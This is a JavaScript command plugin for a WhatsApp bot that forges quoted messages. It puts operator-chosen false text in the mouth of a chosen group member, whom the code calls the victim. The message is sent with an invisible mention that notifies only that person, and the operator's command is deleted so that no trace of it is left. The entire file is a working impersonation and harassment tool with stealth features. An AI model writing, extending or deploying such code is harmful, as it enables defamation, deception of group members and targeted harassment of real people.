export default {
    name: 'suplantacion_cita_v3',
    match: (text) => /^\.(fake3|fq3|fakequote3)(\s+|$)/i.test((text || '').trim()),

    execute: async ({ sock, msg, remitente, textoLimpio, msgType }) => {
        global.cachedGroupList = global.cachedGroupList || [];
        global.recentGroupMessages = global.recentGroupMessages || new Map();

        const isGroup = remitente.endsWith('@g.us');
        let targetGroupJid = isGroup ? remitente : global.lastViewedGroup;

        // ContextInfo de cita o mención
        const contextInfo = msg.message?.extendedTextMessage?.contextInfo
            || msg.message?.imageMessage?.contextInfo
            || msg.message?.videoMessage?.contextInfo
            || (msgType ? msg.message?.[msgType]?.contextInfo : null);

        const quotedParticipant = contextInfo?.participant;
        const mentionedJid = contextInfo?.mentionedJid?.[0];

        // Extraer texto tras el comando
        const rawInput = textoLimpio.replace(/^\.(fake3|fq3|fakequote3)\s*/i, '').trim();

        // Si no hay argumentos ni mensaje citado, mostrar ayuda interactiva
        if (!rawInput && !quotedParticipant) {
            const ayuda = `🎭 *FAKEQUOTE 3.0 (INTERCEPCIÓN REMOTA & DIRECTA)*\n\n`
                + `Inyecta citas falsas con el exploit en memoria usando la lista de .mensajes o citas en vivo.\n\n`
                + `📌 *Uso Remoto (desde este chat privado):*\n`
                + `1. Usa \`.grupos\` para ver grupos vinculados.\n`
                + `2. Usa \`.mensajes 1\` para ver los miembros y mensajes recientes.\n`
                + `3. Ejecuta:\n`
                + `   \`.fake3 <número> | <texto_falso> | [reacción]\`\n`
                + `   _Ejemplo:_ \`.fake3 1 | Me gusta el pne | como?\`\n\n`
                + `📌 *Uso Directo en Grupo:*\n`
                + `- Responde citando cualquier mensaje con:\n`
                + `   \`.fake3 <texto_falso> | [reacción]\`\n`
                + `   _(El bot eliminará tu comando en el grupo y publicará la cita falsa)_\n\n`
                + `📌 *Uso con Mención:* \`.fake3 @usuario texto falso | reacción\``;

            return sock.sendMessage(remitente, { text: ayuda }, { quoted: msg });
        }

        let targetParticipant = '';
        let targetPushName = '';
        let textoFalso = '';
        let reaccion = 'como?';

        // ==========================================
        // MODO 1: Citando directamente un mensaje en el grupo
        // ==========================================
        if (quotedParticipant) {
            targetParticipant = quotedParticipant;
            const separatorIndex = rawInput.indexOf('|');
            if (separatorIndex !== -1) {
                textoFalso = rawInput.slice(0, separatorIndex).trim();
                const customReaccion = rawInput.slice(separatorIndex + 1).trim();
                if (customReaccion) reaccion = customReaccion;
            } else {
                textoFalso = rawInput.trim();
            }
        }

        // ==========================================
        // MODO 2: Usando mención explícita (@usuario texto falso | reacción)
        // ==========================================
        else if (mentionedJid) {
            targetParticipant = mentionedJid;
            const cleanInput = rawInput.replace(/@\d+/g, '').trim();
            const separatorIndex = cleanInput.indexOf('|');
            if (separatorIndex !== -1) {
                textoFalso = cleanInput.slice(0, separatorIndex).trim();
                const customReaccion = cleanInput.slice(separatorIndex + 1).trim();
                if (customReaccion) reaccion = customReaccion;
            } else {
                textoFalso = cleanInput.trim();
            }
        }

        // ==========================================
        // MODO 3: Selector numérico desde .mensajes (<número> | <texto> | [reacción])
        // ==========================================
        else {
            const separatorIndex = rawInput.indexOf('|');
            if (separatorIndex === -1) {
                return sock.sendMessage(remitente, {
                    text: `❌ Formato incorrecto.\n📌 *Uso:* \`.fake3 <número> | <texto_falso> | [reacción]\`\n_Ejemplo:_ \`.fake3 1 | Me gusta el pne | como?\`\nUsa primero \`.mensajes 1\` para ver los números de cada persona.`
                }, { quoted: msg });
            }

            const targetSelector = rawInput.slice(0, separatorIndex).trim();
            const rest = rawInput.slice(separatorIndex + 1).trim();

            const secondSeparator = rest.indexOf('|');
            if (secondSeparator !== -1) {
                textoFalso = rest.slice(0, secondSeparator).trim();
                const customReaccion = rest.slice(secondSeparator + 1).trim();
                if (customReaccion) reaccion = customReaccion;
            } else {
                textoFalso = rest.trim();
            }

            let targetItem = null;
            const mIdx = parseInt(targetSelector, 10) - 1;

            if (!targetGroupJid && global.cachedGroupList?.length > 0) {
                targetGroupJid = global.cachedGroupList[0].id;
            }

            // 1. Prioridad: Buscar en el Snapshot congelado de .mensajes (evita que Pepito desplace a Juanito)
            if (global.lastDisplayedSnapshot && global.lastDisplayedSnapshot.groupJid === targetGroupJid) {
                if (!isNaN(mIdx) && mIdx >= 0 && global.lastDisplayedSnapshot.messages[mIdx]) {
                    targetItem = global.lastDisplayedSnapshot.messages[mIdx];
                } else {
                    const cleanSel = targetSelector.replace(/^#/, '').toUpperCase();
                    targetItem = global.lastDisplayedSnapshot.messages.find(m => 
                        m.shortId === cleanSel || 
                        (m.pushName && m.pushName.toLowerCase().includes(targetSelector.toLowerCase())) ||
                        (m.id && m.id === targetSelector)
                    );
                }
            }

            // 2. Fallback: Buscar en el buffer de memoria en tiempo real
            if (!targetItem && targetGroupJid) {
                const buf = global.recentGroupMessages.get(targetGroupJid) || [];
                if (!isNaN(mIdx) && mIdx >= 0 && buf[mIdx]) {
                    targetItem = buf[mIdx];
                } else {
                    const cleanSel = targetSelector.replace(/^#/, '').toUpperCase();
                    targetItem = buf.find(m => 
                        (m.id && m.id.toUpperCase().endsWith(cleanSel)) ||
                        (m.id && m.id === targetSelector) ||
                        (m.pushName && m.pushName.toLowerCase().includes(targetSelector.toLowerCase()))
                    );
                }
            }

            if (targetItem) {
                targetParticipant = targetItem.participant;
                targetPushName = targetItem.pushName || '';
            } else {
                return sock.sendMessage(remitente, {
                    text: `❌ No se encontró ningún mensaje coincidente con "${targetSelector}".\nUsa un número de \`.mensajes\` (ej: \`.fake3 1 | texto | reaccion\`) o su PIN (ej: \`.fake3 #A1B2 | texto\`).`
                }, { quoted: msg });
            }
        }

        if (!targetGroupJid) {
            return sock.sendMessage(remitente, {
                text: '❌ No hay ningún grupo seleccionado.\nUsa primero `.grupos` y `.mensajes 1` para definir el grupo objetivo.'
            }, { quoted: msg });
        }

        if (!targetParticipant) {
            return sock.sendMessage(remitente, {
                text: '❌ No se encontró a la persona seleccionada en la memoria del grupo.\nEjecuta `.mensajes 1` para actualizar la lista de mensajes.'
            }, { quoted: msg });
        }

        if (!textoFalso) {
            return sock.sendMessage(remitente, {
                text: '❌ Escribe el texto falso que quieres hacerle decir a la víctima.'
            }, { quoted: msg });
        }

        // ==========================================
        // RESOLUCIÓN DE IDENTIDADES Y MENCIÓN DIRIGIDA (GHOST TAG A LA VÍCTIMA)
        // ==========================================
        let finalParticipant = targetParticipant;
        let participantPn = '';
        let groupSubject = 'Grupo';

        try {
            const metadata = await sock.groupMetadata(targetGroupJid).catch(() => null);
            if (metadata) {
                groupSubject = metadata.subject || groupSubject;
                if (Array.isArray(metadata.participants)) {
                    const matchPart = metadata.participants.find(p =>
                        p.id === targetParticipant ||
                        p.lid === targetParticipant ||
                        p.phoneNumber === targetParticipant
                    );
                    if (matchPart) {
                        participantPn = matchPart.phoneNumber || (matchPart.id?.endsWith('@s.whatsapp.net') ? matchPart.id : '');
                        const participantLid = matchPart.lid || (matchPart.id?.endsWith('@lid') ? matchPart.id : '');

                        if (metadata.addressingMode === 'lid' && participantLid) {
                            finalParticipant = participantLid;
                        } else if (participantPn) {
                            finalParticipant = participantPn;
                        }
                    }
                }
            }
        } catch (e) {}

        // Mención invisible dirigida exclusivamente a la víctima (LID + PN para garantizar notificación en su dispositivo)
        const victimMentions = [finalParticipant];
        if (participantPn && !victimMentions.includes(participantPn)) {
            victimMentions.push(participantPn);
        }

        try {
            // 1. Destrucción de evidencia si se ejecutó dentro del grupo
            if (isGroup && msg?.key) {
                try {
                    await sock.sendMessage(remitente, { delete: msg.key });
                } catch (e) {
                    console.log('[INFO] No se pudo borrar el comando en grupo.');
                }
            }

            // 2. Construcción del exploit en memoria (ID sintético forzando renderizado de texto falso)
            const fakeId = "3EB0" + Date.now().toString(16).toUpperCase();
            const mensajeInyectado = {
                key: {
                    fromMe: false,
                    participant: finalParticipant,
                    id: fakeId
                },
                message: {
                    conversation: textoFalso
                }
            };

            // 3. Ejecución: El bot responde con la cita falsa y mención fantasma exclusiva a la víctima
            await sock.sendMessage(targetGroupJid, {
                text: reaccion,
                mentions: victimMentions
            }, {
                quoted: mensajeInyectado
            });

            // 4. Confirmación confidencial al operador si se ejecutó de forma remota
            if (!isGroup) {
                const autorDisplay = participantPn
                    ? participantPn.split('@')[0]
                    : (finalParticipant ? finalParticipant.split('@')[0] : 'Víctima');
                const nombreDisplay = targetPushName ? ` (${targetPushName})` : '';

                const reporte = `🎭 *[FAKEQUOTE + GHOST TAG INYECTADO]*\n\n`
                    + `🎯 *Víctima notificada:* +${autorDisplay}${nombreDisplay}\n`
                    + `💬 *Cita falsa:* "${textoFalso}"\n`
                    + `🗣️ *Reacción/Respuesta:* "${reaccion}"\n`
                    + `👥 *Grupo:* ${groupSubject}\n`
                    + `🔔 *Mención dirigida:* Solo la víctima recibió la notificación (ghost tag invisible).\n`
                    + `🔒 *Sigilo:* Transmitido remotamente sin dejar rastro de comando en el grupo.`;

                return sock.sendMessage(remitente, { text: reporte }, { quoted: msg });
            }

        } catch (err) {
            console.error('[fake3] Error inyectando fakequote:', err);
            return sock.sendMessage(remitente, {
                text: `❌ Fallo en inyección fakequote: ${err.message}`
            }, { quoted: isGroup ? undefined : msg });
        }
    }
};
